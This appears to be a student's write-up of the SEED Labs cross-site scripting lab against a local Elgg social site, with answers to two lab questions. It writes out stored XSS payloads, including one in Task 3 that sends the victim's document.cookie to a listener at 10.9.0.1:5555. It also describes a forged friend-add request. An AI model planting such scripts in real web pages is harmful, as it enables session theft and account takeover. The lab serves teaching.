# SEED Labs – Cross-Site Scripting Attack Lab
## Semana 10 e 11

### Task 1
#### Posting a Malicious Message to Display an Alert Window

This task consists in writing the following JavaScript in the 'Brief Description' in Alice's profile: <script>alert('XSS  ');</script>

![task1(1)](https://user-images.githubusercontent.com/116459746/235372633-efc9b388-04bb-4e6f-8bc1-e7fbd0e910d0.png)

When we save the profile, we recieve an alert window with the word "XSS", the one we wrote in the alert message of the Javascript.

![task1(2)](https://user-images.githubusercontent.com/116459746/235372638-28350a73-6357-4b11-a7c9-f6be70b34b89.png)

### Task 2
#### Posting a Malicious Message to Display Cookies

This task consists in writing the following JavaScript in the 'Brief Description' in Alice's profile: <script>alert(document.cookie);</script>

![task2(1)](https://user-images.githubusercontent.com/116459746/235372647-009dd0a7-887c-4142-adf4-bdd129c4f695.png)

When we save the profile, we recieve an alert window. As we can see from HTTP Header Live, the alert window display the current cookies in use.

![task2(2)](https://user-images.githubusercontent.com/116459746/235372652-235877f9-c4ca-4b8c-825c-5fce2052573c.png)

### Task 3
#### Stealing Cookies from the Victim's Machine

The first step in this task is running the following code in the terminal.

![task3(start)](https://user-images.githubusercontent.com/116459746/235383869-652767ab-beb8-49f6-a3dd-729f434d23a5.png)

Next, we write the following JavaScript in the 'Brief Description' in Alice's profile: "<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>"

![task3(1)](https://user-images.githubusercontent.com/116459746/235383928-f91ddf87-d68e-45b6-80f4-03295069b1f4.png)

As we save the Alice's profile with that message in the 'Brief Description', the code we put on running in the beginning print us Alice's cookies in the terminal.

![task3(2)](https://user-images.githubusercontent.com/116459746/235383931-540e2358-b5d4-4d1b-ae87-df228474e901.png)

### Task 4
#### Becoming the Victim’s Friend

After logging in Alice's profile, we follow the next steps: Members - Samy - Add Friend

![task4(1)](https://user-images.githubusercontent.com/116459746/235384268-a841aaf1-e08a-4d1c-a139-1def09886dd8.png)

As we can see from HTTP Header Live, the friend's value is 59, so we understand that Samy's guid is 59.
Also, we know that the first site HTTP Header Live give us is called sendurl, the field we have to complete: var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;

We remove Samy as a friend in Alice's profile and Alice doesn't have any friends now.

Then, we go to Samy's profile and in the 'Brief Description' on his profile we write the following message, completing it with var sendurl field: 

![task4(5)](https://user-images.githubusercontent.com/116459746/235469434-aac28539-fc56-4d3f-80b9-02b489f8b727.png)

![task4(2)](https://user-images.githubusercontent.com/116459746/235464804-d3e01857-95eb-4338-870f-41143ce5a36c.png)

We save the Samy's new profile and we go to Alice's profile again.

First, we confirm that Alice has no friends at the moment.

![task4(3)](https://user-images.githubusercontent.com/116459746/235466582-4d4a40e4-d907-4560-bf2f-bf0f25d03f95.png)

And only by visiting Samy's profile, Alice is friend with Samy again without even adding it as a friend.

![task4(4)](https://user-images.githubusercontent.com/116459746/235465669-ce0cf10a-7823-44d0-8cfd-58f605f0d1b2.png)

### Question 1
#### Explain the purpose of Lines 1 and 2, why are they needed?
They are refering to the JavaScript code we have to complete:
![task4(5)](https://user-images.githubusercontent.com/116459746/235469154-8cd8519e-8f13-4a8d-abcb-c4eba8bc2383.png)

Line 1 represents a timestamp used for security matters, such like prevent CSRF(Cross-Site Request Forgery) attacks.
Line 2 represents a unique token, a database or information about autentication, autorization and security in a computer system. It is used to autenticate the actual user and prevent from other unauthorized users or unauthorized systems get to confidential information or resources.
Both lines represents a URL (Uniform Resource Locator) including timestamp and a token as consulting parameters, used to make server requests, ensuring the authenticity and integrity of the request.
If the attacker doesn't have both timestamp value and the secret token of the website in his request, the computer will consider it not legit and it will me thrown out an error.

### Question 2
#### If the Elgg application only provide the Editor mode for the "About Me" field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?
If we couldn't change it to Text mode, we couldn't launch a successful attack because Editor mode encode special characters that are display in the input.
As we need to use <script>@</script> to execute JavaScript code, we wouldn't be able to do it because special characters would be data encoded.
